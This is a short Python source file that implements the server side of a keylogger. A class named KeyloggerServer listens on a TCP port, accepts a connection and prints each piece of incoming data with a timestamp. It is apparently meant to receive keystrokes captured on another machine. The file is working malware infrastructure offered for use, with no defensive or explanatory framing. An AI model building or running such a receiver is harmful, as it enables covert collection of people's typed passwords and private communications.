import socket
import threading
from datetime import datetime

class KeyloggerServer:
    def __init__(self, host: str, port: int, daemon: bool = True):
        self.host = host
        self.port = port
        self.server_socket = None
        self.running = False
        self.daemon = daemon

    def start(self):
        """Запуск сервера в отдельном потоке"""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(1)
        self.running = True
    
        print(f"Server started at {self.host}:{self.port}")

        server_thread = threading.Thread(target=self._accept_connections)
        server_thread.daemon = self.daemon
        server_thread.start()
        if not self.daemon:
            server_thread.join()
    
    def stop(self):
        """Остановка сервера"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        print("Server stopped")
    
    def _accept_connections(self):
        """Принимаем подключания"""
        while self.running:
            try:
                print('Waiting for connections')
                client_socket, client_addr = self.server_socket.accept()
                print(f"New connection from {client_addr}")

                while True:
                    data = client_socket.recv(4096).decode('utf-8')
                    if not data:
                        break

                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    print(f"[{timestamp}] {data}")

            except (ConnectionResetError, UnicodeDecodeError):
                break
        print('Connection closed')